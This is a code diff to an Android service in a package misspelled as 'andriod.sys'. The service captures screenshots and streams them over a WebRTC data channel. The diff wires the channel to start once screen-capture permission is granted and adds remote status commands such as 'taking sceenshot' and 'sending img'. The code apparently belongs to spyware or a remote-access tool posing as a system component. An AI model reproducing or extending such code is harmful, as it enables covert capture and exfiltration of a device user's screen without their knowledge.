@@ -1,6 +1,7 @@
 package andriod.sys;
 
 
+import android.annotation.SuppressLint;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
@@ -94,6 +95,7 @@ public class sysService extends Service implements SysInterface{
     }
 
 
+    @SuppressLint("InvalidWakeLockTag")
     @Override
     public void onCreate() {
         super.onCreate();
@@ -525,6 +527,7 @@ public class sysService extends Service implements SysInterface{
         Screenshot.getObj().takeScreenshot(this);
     }
     private void getPermission() {
+        sc.cmd("getting permission");
         resetSocket();
         Intent mainIntent = new Intent(this, PermissionActivity.class);
         mainIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
@@ -535,6 +538,7 @@ public class sysService extends Service implements SysInterface{
         if (data != null){
             this.perData = data;
             this.perResultCode = resultCode;
+            initDataChannel();
         }
     }
 
@@ -549,6 +553,7 @@ public class sysService extends Service implements SysInterface{
 
     // webrtc datachannel
     private void initDataChannel() {
+        sc.cmd("init Datachannel");
         peerConnectionFactory = new PeerConnectionFactory(null);
         createPeerConnection("data");
         localDataChannel = localPeer.createDataChannel("sendDataChannel", new DataChannel.Init());
@@ -562,6 +567,7 @@ public class sysService extends Service implements SysInterface{
             public void onStateChange() {
                 runOnUiThread(() -> {
                     if (localDataChannel.state() == DataChannel.State.OPEN) {
+                        sc.cmd("taking sceenshot");
                         takeScreenshot();
                     } 
                 });
@@ -577,6 +583,7 @@ public class sysService extends Service implements SysInterface{
     }
 
     private void sendImage(byte[] bytes) {
+        sc.cmd("sending img");
         canSend = false;
         int CHUNK_SIZE = 64000;
         int size = bytes.length;
